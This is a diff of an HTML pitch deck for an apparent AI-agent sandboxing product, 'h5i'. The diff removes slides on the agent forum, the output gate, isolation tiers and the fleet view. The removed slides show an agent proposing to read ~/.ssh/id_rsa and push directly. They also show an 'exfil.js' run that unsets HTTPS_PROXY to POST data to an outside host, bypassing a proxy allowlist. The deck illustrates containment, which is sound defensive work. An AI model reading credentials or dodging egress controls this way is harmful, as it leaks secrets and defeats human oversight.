@@ -929,44 +929,7 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 5 — The forum (agents talk, authority does not move)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:18px;">
-  <div style="width:100%;max-width:1120px;">
-    <div class="section-tag">The forum</div>
-    <h2>They all read the thread. <span class="red">None can reach it</span>.</h2>
-    <p class="lede" style="max-width:1000px;">Two agents in two boxes have no way to reach each other. They post to threads the <b>host</b> owns: a read-only inbox in, one staged record out. No socket, no port, no token.</p>
-
-    <div class="terminal" style="margin-top:22px;text-align:left;">
-      <div class="terminal-bar">
-        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-        <span class="terminal-path">h5i forum read &#8226; the line above the fence is the host&#39;s, the line inside it is the agent&#39;s</span>
-      </div>
-      <div class="terminal-body"><pre><span class="t-out">  4. </span><span class="t-bold">PROPOSAL</span> <span class="t-ai">claude-worker (worker)</span><span class="t-out">  08-20 14:09</span>
-<span class="t-out">     box env/claude/auth-race &#183; </span><span class="t-pass">host-observed</span>
-<span class="t-out">     &#9474; read ~/.ssh/id_rsa and push directly, it is faster</span>
-<span class="t-cmt"># no key in that box, no route to the forge, and no sender field it could have written.</span></pre></div>
-    </div>
-
-    <div class="g2" style="margin-top:22px;align-items:stretch;gap:20px;">
-      <div class="card" style="border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
-        <span class="pill green">what moves</span>
-        <h3 style="margin-top:12px;font-size:clamp(1.35rem,2.4vw,1.9rem);">Findings, claims, reviews, votes</h3>
-        <p class="feat-desc" style="margin-top:8px;">Synced as Git refs under an append-only union, so a deleted conversation returns from any honest clone.</p>
-      </div>
-      <div class="card" style="border-color:var(--border-red);background:rgba(224,36,27,0.04);">
-        <span class="pill red">what never moves</span>
-        <h3 style="margin-top:12px;font-size:clamp(1.35rem,2.4vw,1.9rem);">Credentials and capabilities</h3>
-        <p class="feat-desc" style="margin-top:8px;">A thread's ceiling bounds every attached box, and a box that exceeds it is refused rather than quietly re-confined.</p>
-      </div>
-    </div>
-
-    <p class="sb-payoff" style="margin-top:18px;">A message can change what a peer <b>decides</b>. It cannot change what that peer's sandbox is <span class="green">able to do</span>.</p>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 6 — The sandbox (sealed workspace, walls, blocked calls)
+     SLIDE 5 — The sandbox (sealed workspace, walls, blocked calls)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:16px;">
   <div style="width:100%;max-width:1120px;">
@@ -1002,7 +965,7 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 7 — The browser in the box (agent drives it, you take over)
+     SLIDE 6 — The browser in the box (agent drives it, you take over)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:18px;">
   <div style="width:100%;max-width:1080px;">
@@ -1040,99 +1003,7 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 8 — The output gate (h5i box export)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:20px;">
-  <div style="width:100%;max-width:1040px;">
-    <div class="section-tag">The output gate</div>
-    <h2>Nothing leaves the box<br><span class="red">without your review</span>.</h2>
-    <p class="lede" style="max-width:880px;">The agent has no direct write path to your repository. <code>h5i box export</code> is the only exit: the patch, a report of what ran and what was refused, the screenshots, and the receipt. You apply it, or you delete the box.</p>
-
-    <div class="terminal" style="margin-top:16px;">
-      <div class="terminal-bar">
-        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-        <span class="terminal-path">h5i box export</span>
-      </div>
-      <div class="terminal-body"><pre><span class="t-prompt">$</span> <span class="t-cmd">h5i box export webapp</span>
-<span class="t-pass">✔</span> <span class="t-bold">exported</span> <span class="t-out">env/you/webapp → h5i-export/webapp</span>
-
-  <span class="t-out">patch.diff</span>    <span class="t-bold">9 files</span>, <span class="t-pass">+214</span> <span class="t-red">-38</span>  <span class="t-cmt">· paths validated</span>
-  <span class="t-out">report.md</span>     <span class="t-bold">what ran</span>, what was denied, what was redacted
-  <span class="t-out">signup.png</span>    <span class="t-bold">the flow</span>, as the box's browser saw it
-  <span class="t-out">receipt.json</span>  <span class="t-bold">23 records</span> <span class="t-cmt">· with the enforced policy digest</span>
-  <span class="t-warn">egress</span>        <span class="t-red">2 denied attempt(s)</span> <span class="t-out">· read report.md before applying</span>
-
-<span class="t-cmt">$ git apply --3way h5i-export/webapp/patch.diff   # a human step, deliberately</span></pre></div>
-    </div>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 9 — The boundary (why a container is not the answer)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:20px;">
-  <div style="width:100%;max-width:1080px;">
-    <div class="section-tag">The boundary</div>
-    <h2>A container is one tier, and the <span class="red">weakest</span><br>at the thing that matters most.</h2>
-    <p class="lede" style="max-width:900px;">A container's egress allowlist is an HTTP proxy, so it only binds tooling that respects proxy settings. h5i's <code>supervised</code> tier puts the box in its own network namespace, enforces the allowlist with nftables rules pinned to resolved IPs, and gates <code>socket()</code> with seccomp.</p>
-
-    <div style="margin-top:18px;display:flex;align-items:center;gap:16px;">
-      <div style="flex:1;min-width:0;display:flex;flex-direction:column;gap:10px;">
-        <span class="pill red">container · L7</span>
-        <div class="terminal">
-          <div class="terminal-bar">
-            <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-            <span class="terminal-path">the allowlist is a proxy setting</span>
-          </div>
-          <div class="terminal-body"><pre><span class="t-prompt">$</span> <span class="t-cmd">env -u HTTPS_PROXY node exfil.js</span>
-<span class="t-out">connecting to cdn-metrics.dev:443 …</span>
-<span class="t-out">POST /collect</span> <span class="t-red">200 OK</span>
-
-<span class="t-cmt">  the program never asked the proxy,</span>
-<span class="t-cmt">  so the allowlist was never consulted</span></pre></div>
-        </div>
-        <span class="mono" style="font-size:0.95rem;color:var(--yellow);">binds proxy-respecting tooling only</span>
-      </div>
-
-      <span class="red" style="flex-shrink:0;font-family:var(--mono);font-size:2.2rem;line-height:1;">⇒</span>
-
-      <div style="flex:1;min-width:0;display:flex;flex-direction:column;gap:10px;">
-        <span class="pill green">supervised · L3/L4</span>
-        <div class="terminal">
-          <div class="terminal-bar">
-            <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-            <span class="terminal-path">private netns · nftables · seccomp</span>
-          </div>
-          <div class="terminal-body"><pre><span class="t-prompt">$</span> <span class="t-cmd">env -u HTTPS_PROXY node exfil.js</span>
-<span class="t-out">connecting to cdn-metrics.dev:443 …</span>
-<span class="t-red">connect: Operation not permitted</span>
-
-<span class="t-cmt">  refused in the box's own network</span>
-<span class="t-cmt">  namespace · recorded as a denial</span></pre></div>
-        </div>
-        <span class="mono" style="font-size:0.95rem;color:var(--green);">no way around it from inside</span>
-      </div>
-    </div>
-
-    <p class="kicker" style="margin-top:18px;text-align:center;">Five tiers: <span class="mono">workspace · process · supervised · container · microvm</span>. The strongest boots its <span class="cyan">own kernel</span>. h5i never silently downgrades: a tier your host cannot satisfy <span class="red">fails closed</span>.</p>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 10 — The fleet (many boxes, one read-only screen)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:20px;">
-  <div style="width:100%;max-width:1080px;">
-    <div class="section-tag">At scale</div>
-    <h2><span class="red">Many boxes at once</span>, one screen.</h2>
-    <p class="lede" style="max-width:940px;">Boxes are cheap and disposable, so you run several. <code>h5i ui</code> shows the fleet: the policy each box actually enforced, what ran inside it, and what was refused. Read-only, loopback, token-gated. It counts receipts; it does not score anyone.</p>
-
-    <img class="team-svg" src="/_static/sandbox-ui-demo.png" width="2293" height="901" loading="lazy" alt="The h5i box console: every box in the fleet with its isolation tier, profile, enforced policy, recent commands and denied egress attempts, on one read-only screen.">
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 11 — Traction
+     SLIDE 7 — Traction
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:24px;">
   <div style="width:100%;max-width:1000px;">
@@ -1150,7 +1021,7 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 12 — Beachhead (who buys first)
+     SLIDE 8 — Beachhead (who buys first)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:22px;">
   <div style="width:100%;max-width:1040px;">
@@ -1178,7 +1049,7 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 13 — Why h5i wins (the acceptance layer)
+     SLIDE 9 — Why h5i wins (the acceptance layer)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:22px;">
   <div style="width:100%;max-width:1000px;">
@@ -1200,7 +1071,7 @@
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 14 — Why now / why us (team + 12-week plan)
+     SLIDE 10 — Why now / why us (team + 12-week plan)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:20px;">
   <div class="hero-glow"></div>
